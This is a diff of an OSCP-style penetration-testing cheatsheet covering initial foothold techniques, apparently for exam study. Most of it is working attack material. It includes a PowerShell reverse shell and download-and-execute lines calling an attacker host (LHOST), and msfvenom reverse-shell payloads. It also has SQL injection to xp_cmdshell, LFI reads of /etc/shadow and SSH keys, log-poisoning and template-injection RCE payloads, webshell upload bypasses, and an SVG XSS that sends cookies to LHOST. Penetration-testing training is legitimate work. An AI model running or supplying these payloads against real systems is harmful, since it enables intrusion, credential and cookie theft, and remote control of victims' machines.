@@ -1,6 +1,8 @@
-# 02 · Foothold — Shells, Web & Exploits
+# 02 · Foothold: Shells, Web & Exploits
 
-> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)
+> Part of the **OSCP/OSCP+ cheatsheet** | [← back to index](README.md)
+
+> More: [file transfer](foothold/file-transfer.md) · [manual SQL injection](web/manual-sqli.md) · [XSS checks](web/xss.md) · [files and command input](web/files-and-commands.md) · [web auth](web/auth-and-template.md) · [SSTI](web/ssti.md) · [SSRF](web/ssrf.md)
 
 ---
 
@@ -32,12 +34,12 @@ perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 # Powershell (Windows)
 powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
 ```
-- Generate/encode shells fast: **revshells.com** (memorize the format; can't browse during exam unless you cache it). msfvenom equivalents below.
-- **Shell fires but never connects back?** Suspect egress filtering on the target — outbound is often restricted to a few ports. Before assuming the RCE failed, retry your listener on **80 / 443 / 53** (almost always allowed out). Same applies to staging downloads: host your payload on `:80`/`:443`.
+- Generate/encode shells fast: **revshells.com**. Keep a local copy of the formats you use; msfvenom equivalents are below.
+- **Shell fires but never connects back?** Check the target's outbound access before assuming the command failed. Try a listener on an allowed port, such as **80** or **443**, and verify the connection. The same check applies to staging downloads.
 
 ### Stabilize a Linux TTY (do this immediately)
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'   # target — or: script -qc /bin/bash /dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # target: or: script -qc /bin/bash /dev/null
 # then:
 export TERM=xterm
 # Ctrl+Z backgrounds it
@@ -49,25 +51,23 @@ stty size            # note rows/cols
 stty rows 50 cols 200   # target
 ```
 
-### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
+### Fully-interactive Windows shell (ConPtyShell: the Windows `stty` trick)
 Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
 ```bash
-# kali — raw terminal, note size, then listen
+# kali: raw terminal, note size, then listen
 stty raw -echo; (stty size)          # -> e.g. 50 200
 nc -lvnp 443
 ```
 ```powershell
-# target — from the dumb shell
+# target: from the dumb shell
 IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
 # kali afterwards: stty sane   (or: reset)
 ```
 
-### msfvenom payloads (NOT counted as Metasploit usage)
+### msfvenom payloads
 ```bash
 # Windows exe reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f exe -o rev.exe
-# Windows staged meterpreter (only if this is your one MSF box)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=L LPORT=443 -f exe -o met.exe
 # Linux elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=443 -f elf -o rev.elf
 # War (Tomcat)
@@ -84,8 +84,8 @@ msfvenom -p php/reverse_php LHOST=L LPORT=443 -f raw -o shell.php
 # --- Serve from attacker ---
 python3 -m http.server 80
 impacket-smbserver share . -smb2support            # add -user x -password y if needed
-# Windows-friendly SMB (NTLMv1 fallback older boxes):
-impacket-smbserver share $(pwd) -smb2support
+# Serve an explicit directory instead of the current one:
+impacket-smbserver share /path/to/files -smb2support
 
 # --- Linux target pulls ---
 wget http://LHOST/file -O /tmp/file
@@ -128,18 +128,14 @@ powershell -c "(New-Object Net.WebClient).UploadFile('http://LHOST/up','f')"   #
 -- MSSQL stacked + RCE
 '; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';-- -
 ```
-```bash
-# sqlmap is BANNED on the exam (automatic exploitation tool). Do SQLi MANUALLY there.
-# For OFF-EXAM practice only, to learn what a vuln looks like:
-#   sqlmap -r req.txt --batch --dbs   /   --dump   (never on the real exam)
-```
+See [manual SQL injection](web/manual-sqli.md).
 Blind: `' AND 1=1-- -` vs `' AND 1=2-- -`; time: `' AND SLEEP(5)-- -` / `WAITFOR DELAY '0:0:5'`.
 
 ### LFI / RFI / path traversal
 ```bash
 # Basic
 http://$IP/page.php?file=../../../../etc/passwd
-# Double / nested traversal bypass (Trick box pattern)
+# Double / nested traversal bypass
 ....//....//....//etc/passwd        # strips "../" once
 %2e%2e%2f  / %252e (double url-encode)
 # PHP wrappers
@@ -150,17 +146,13 @@ expect://id                                                     # if expect ext
 # Log poisoning -> RCE (inject PHP into User-Agent, then include the log)
 curl http://$IP/ -A "<?php system(\$_GET['c']); ?>"
 ?file=/var/log/apache2/access.log&c=id
-# PHP FILTER CHAIN -> RCE (no log/upload needed; great when only LFI exists - Dante pattern)
-#   github.com/synacktiv/php_filter_chain_generator
-python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
-#   paste the produced php://filter/... blob as the include value, then &c=id
 # Other read targets: /proc/self/environ, ssh keys (/home/u/.ssh/id_rsa),
 #   /var/www/html/config.php, web.config, /etc/shadow, history files
 ```
 Windows LFI: `..\..\..\Windows\System32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config`.
 
 ### File upload bypass → webshell
-- Extension tricks: `shell.php.jpg`, `shell.pHp`, `shell.php5/.phtml/.phar`, **trailing dot** `shell.php.` (Environment box pattern), null byte `shell.php%00.jpg` (old PHP), double ext.
+- Extension tricks: `shell.php.jpg`, `shell.pHp`, `shell.php5/.phtml/.phar`, **trailing dot** `shell.php.`, null byte `shell.php%00.jpg` (old PHP), double ext.
 - Content-Type spoof: set `Content-Type: image/png` but PHP body.
 - Magic bytes: prepend `GIF89a;` then `<?php system($_GET['c']);?>`.
 - `.htaccess` upload to map a new ext to PHP: `AddType application/x-httpd-php .xyz`.
@@ -179,7 +171,7 @@ cat${IFS}/etc/passwd
 
 ### NoSQL injection (Mongo-backed apps)
 ```
-# Auth bypass — JSON body:  {"user":{"$ne":null},"pass":{"$ne":null}}
+# Auth bypass: JSON body:  {"user":{"$ne":null},"pass":{"$ne":null}}
 # URL params:               user[$ne]=x&pass[$ne]=x   |   user[$regex]=^admin
 # Blind exfil, char by char: pass[$regex]=^a  ->  ^ab  ->  ...
 # JS eval sinks: '"><script> or  ';return true;var _='   (operator/$where injection)
@@ -187,7 +179,7 @@ cat${IFS}/etc/passwd
 
 ### GraphQL
 ```bash
-# Introspection is often left on — dump the whole schema:
+# Introspection is often left on: dump the whole schema:
 curl -s http://$IP/graphql -H 'Content-Type: application/json' \
   -d '{"query":"{__schema{types{name fields{name}}}}"}'
 # Then query hidden types/fields; resolvers frequently skip authz -> IDOR / data leak.
@@ -195,14 +187,15 @@ curl -s http://$IP/graphql -H 'Content-Type: application/json' \
 ```
 
 ### Path / auth-filter bypass quickies
-- **Tomcat/Spring** path filter bypass: `..;/` segment — `/app/..;/manager/html`, `/;/admin`.
+- **Tomcat/Spring** path filter bypass: `..;/` segment: `/app/..;/manager/html`, `/;/admin`.
 - **Nginx alias traversal:** `location /x` mapped to `alias /y/` → `/x../` escapes the dir.
 - **`../` filtered:** try `%2e%2e%2f`, `..%2f`, `....//`, or double-encode `%252e%252e%252f`.
 - **Reverse-proxy trust:** spoof `X-Forwarded-For: 127.0.0.1` / `X-Original-URL` / `X-Rewrite-URL` to reach admin-only paths.
 
-### SSRF (DevArea / Apache CXF pattern)
+### SSRF
+See [SSRF checks](web/ssrf.md) for a callback test and local-service triage.
 - Hit internal services: `http://127.0.0.1:port`, cloud metadata `http://169.254.169.254/...`.
-- Bypass filters: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` tricks `http://allowed@127.0.0.1`.
+- Parser-dependent filter checks: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` userinfo such as `http://allowed@127.0.0.1`.
 - Chain to internal admin panels / Redis / unauth APIs.
 
 ### XXE
@@ -214,17 +207,18 @@ curl -s http://$IP/graphql -H 'Content-Type: application/json' \
 ### Common app footholds (searchsploit the exact version)
 - **WordPress:** vuln plugins, `wp-config.php` creds, admin → theme editor → PHP RCE, xmlrpc password attack.
 - **Tomcat:** `/manager/html` default creds (`tomcat:tomcat`, `admin:admin`) → deploy `.war`.
-- **Jenkins:** `/script` Groovy console → RCE (Jeeves pattern). `Runtime.getRuntime().exec(...)`.
+- **Jenkins:** `/script` Groovy console → RCE. `Runtime.getRuntime().exec(...)`.
 - **Git exposed:** `.git/` → `git-dumper` → source/creds.
-- **Default creds everywhere** — try before exploiting.
+- **Default creds everywhere**: try before exploiting.
 
 ---
 
 ### Server-Side Template Injection (SSTI)
+See [manual SSTI checks](web/ssti.md) before choosing an engine-specific payload.
 ```bash
 # Detect: inject and look for evaluation -> "49"
 {{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   ${{7*7}}   *{7*7}
-# Polyglot to fingerprint engine: ${{<%[%'"}}%\
+# Special-character error probe; it does not identify the engine by itself: ${{<%[%'"}}%\
 # Jinja2 (Python/Flask) RCE:
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
@@ -235,45 +229,35 @@ curl -s http://$IP/graphql -H 'Content-Type: application/json' \
 # Freemarker (Java):
 <#assign ex='freemarker.template.utility.Execute'?new()>${ ex('id') }
 # Ruby ERB:  <%= `id` %>      Velocity / Smarty also vuln
-# tplmap = semi-automated (allowed; manual preferred). Base64-wrap cmds to dodge filters.
+# Fingerprint the template engine and validate the selected path manually.
 ```
 
 ### Insecure deserialization
-```bash
-# Java (ysoserial) - blobs: base64 starts "rO0AB", hex "ac ed 00 05"
-java -jar ysoserial.jar CommonsCollections5 'curl http://LHOST/x' | base64 -w0
-#   gadgets: URLDNS (detect/blind), CommonsCollections1-7, Groovy1, Spring1
-# .NET (ysoserial.net) - __VIEWSTATE, BinaryFormatter, Json.NET, Losformatter
-ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
-#   ViewState w/ leaked machineKey (Hercules pattern):
-ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=<ALG> -c "cmd /c whoami"
-# PHP object injection (unserialize + magic methods __wakeup/__destruct):
-phpggc Symfony/RCE4 system id          # generate gadget chain
-# Python pickle (vulnerable loads()):
-python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("E",(),{"__reduce__":lambda s:(os.system,("id",))})())) )'
-```
+Identify the input format and the code path that deserializes it before trying a platform-specific payload:
+
+- **Java:** serialized data often starts with `rO0AB` in base64 or `ac ed 00 05` in hex. Check which classes and libraries the application loads.
+- **.NET:** look for `__VIEWSTATE`, BinaryFormatter, Json.NET, or LosFormatter. A leaked `machineKey` matters when investigating a protected ViewState value.
+- **PHP:** look for `unserialize()` on user-controlled data and classes with `__wakeup()` or `__destruct()` methods.
+- **Python:** look for `pickle.loads()` on user-controlled data.
+
+These are leads, not proof of code execution. Confirm the parser and reachable code path in the application.
 
 ### JWT (JSON Web Token) attacks
 ```bash
-# Decode offline: echo <part> | base64 -d   (or jwt.io offline)
+# Decode a token part offline: echo <part> | base64 -d
 # alg:none bypass -> set header {"alg":"none"}, drop signature but KEEP trailing dot
 # Weak HMAC secret -> crack then re-sign:
 hashcat -m 16500 jwt.txt rockyou.txt
 # RS256->HS256 confusion: sign with server's PUBLIC key bytes as the HMAC secret
-# jwt_tool does all of it:
-python3 jwt_tool.py <JWT> -X a                 # alg:none
-python3 jwt_tool.py <JWT> -C -d rockyou.txt    # crack secret
-python3 jwt_tool.py <JWT> -T                   # tamper/re-sign
 ```
 
-### Client-side / auth-flow (lower OSCP priority, but seen — Eloquia pattern)
+### Client-side / auth-flow
 ```bash
 # Stored XSS via SVG upload -> steal admin cookie:
 <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://LHOST/?c='+document.cookie)</script></svg>
 # OAuth/SAML CSRF, open-redirect chained to token theft
-# IDOR / broken access control: change id params, hit endpoints without auth, mass-assignment (Facts pattern)
-# PEN-200 client-side delivery (when a box expects a user to "open" something):
+# IDOR / broken access control: change id params, hit endpoints without auth, mass-assignment
+# Client-side delivery (when a user is expected to open a file):
 #   - VBA macro in .doc/.docm with a powershell reverse shell (macro_reverse_shell)
 #   - config.Library-ms + .lnk over WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
 #     .lnk runs: powershell IEX(New-Object Net.WebClient).DownloadString('http://LHOST/p.ps1')
